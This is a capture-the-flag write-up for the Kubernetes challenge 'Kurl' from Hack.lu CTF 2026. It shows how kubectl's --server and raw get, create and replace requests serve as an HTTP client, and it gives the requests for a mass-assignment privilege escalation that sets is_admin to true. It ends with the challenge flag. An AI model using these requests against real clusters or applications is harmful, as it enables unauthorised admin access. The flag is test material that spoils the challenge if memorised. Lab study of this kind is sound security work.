# Kurl Writeup ( Hack.lu CTF 2026 )

- **Category:** Misc
- **Label:** Kubernetes
- **Points:** Dynamic

## Methodology

### Step 1: Spawn the Instance and Download the Kubernetes Configuration

Spawn the Kurl challenge instance and download the provided Kubernetes configuration YAML (`kubeconfig`).

### Step 2: Configure `kubectl` and Verify Cluster Access

Set the `KUBECONFIG` environment variable to the downloaded configuration file and verify access to the cluster.

```bash
export KUBECONFIG="$(pwd)/kubeconfig"

kubectl cluster-info
kubectl get namespaces
```

If the commands execute successfully, the cluster is accessible. Identify the `ctf` namespace, which contains the challenge resources.

### Step 3: Enumerate Kubernetes Resources

Enumerate the pods, Services, and NetworkPolicies in the `ctf` namespace.

```bash
kubectl get pods -n ctf -o wide
kubectl get svc -n ctf
kubectl get networkpolicies -n ctf
```

The pod listing reveals pod names, statuses, and IP addresses. Identify the `player-shell` and `flag-server` pods. The Service listing provides additional information about how applications are exposed inside the cluster.

NetworkPolicies are particularly important because they define the permitted network traffic between pods.

### Step 4: Inspect Network Policies and Identify the Target

Inspect the NetworkPolicies to determine which connections are allowed.

```bash
kubectl describe networkpolicy -n ctf
```

Look for a policy that permits `player-shell` to communicate with `flag-server` over TCP port `8080`. Record the current IP address of the `flag-server` pod from Step 3.

The next step is to access the permitted source pod and determine how to communicate with the service.

### Step 5: Access the Player Shell

Execute a shell inside the `player-shell` pod.

```bash
kubectl exec -it player-shell -n ctf -- /bin/sh
```

Check whether common HTTP clients and scripting interpreters are installed:

```sh
which curl wget nc python3 perl
```

The container is minimal and lack these utilities. Rather than installing additional software, use `kubectl`'s `--server` option and `get --raw` as an alternative way to issue HTTP requests.

Run the following command from an environment where `kubectl` is available and can reach the target:

```bash
kubectl --server="http://<FLAG_SERVER_POD_IP>:8080" \
  get --raw=/
```

Replace `<FLAG_SERVER_POD_IP>` with the actual address discovered in **Step 3**. If the request succeeds, the response should provide information about the application running on port `8080`.

This is the key technique behind the challenge: `kubectl` can send raw HTTP requests to a specified server, so a separate HTTP client is not necessary.

### Step 6: Enumerate the Application Endpoints

Inspect the application's root endpoint and its OpenAPI specification.

```bash
kubectl --server="http://<FLAG_SERVER_POD_IP>:8080" \
  get --raw=/

kubectl --server="http://<FLAG_SERVER_POD_IP>:8080" \
  get --raw=/openapi.yaml
```

The application identifies itself as Vaultboard. Its API specification describes endpoints such as `/register`, `/login`, `/dashboard`, and `/profile`.

Read the request schemas and compare the accepted fields for registration and profile updates. 

**Note:** fields related to account roles and privileges are of main interest.

### Step 7: Identify the Mass-Assignment Vulnerability

The API specification reveals a difference between the registration and profile-update endpoints:

- Registration does not allow the client to specify `is_admin`.
- The profile-update endpoint accepts a user object that includes `is_admin`.

This suggests a potential **mass-assignment vulnerability**. If the backend applies user-supplied properties directly to the account without restricting privileged fields, then an ordinary user is able to modify their own administrator status.

The next step is to create a normal account and test whether the profile-update endpoint enforces the expected authorization restrictions.

### Step 8: Register a Normal Account

Register an ordinary user through the application's registration endpoint.

```bash
kubectl --server="http://<FLAG_SERVER_POD_IP>:8080" \
  create --raw=/register -f - <<'EOF'
{"username":"researcher1","password":"TestPass-9281"}
EOF
```

Examine the response and record the application session token. This token is used to authenticate subsequent requests to the application.

Use the token returned by your own challenge instance; do not assume a token from another instance will work.

### Step 9: Exploit Mass Assignment to Escalate Privileges

Send a profile-update request that includes the `is_admin` field.

```bash
kubectl --server="http://<FLAG_SERVER_POD_IP>:8080" \
  replace --raw='/profile?token=<SESSION_TOKEN>' -f - <<'EOF'
{"username":"researcher1","password":"TestPass-9281","is_admin":true}
EOF
```

Replace `<SESSION_TOKEN>` with the token obtained in Step 8.

The request attempts to set `is_admin` to `true`. If the application accepts the field without checking whether the user is authorized to modify it, the account is elevated to administrator.

The successful response, followed by access to the protected dashboard, confirms the impact of the vulnerability.

### Step 10: Retrieve the Flag

Use the same session token to access the dashboard.

```bash
kubectl --server="http://<FLAG_SERVER_POD_IP>:8080" \
  get --raw='/dashboard?token=<SESSION_TOKEN>'
```

The dashboard returns the administrator-only content, including the challenge flag.

**Flag:**

```text
flag{kubectl_1s_just_curl_w1th_3xtr4_st3ps}
```
